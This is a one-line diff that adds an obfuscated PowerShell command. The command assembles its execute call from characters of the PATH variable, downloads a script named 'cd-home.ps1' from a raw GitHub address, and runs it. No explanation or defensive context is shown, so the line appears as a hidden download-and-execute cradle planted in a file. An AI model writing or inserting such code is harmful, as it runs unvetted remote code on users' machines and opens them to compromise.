@@ -1,0 +1,1 @@
+﻿. ($env:Path[12,14,18]-join'') (new-object net.webclient).DownloadString("https://raw.githubusercontent.com/IoTShark/PowerShell/main/scripts/cd-home.ps1")
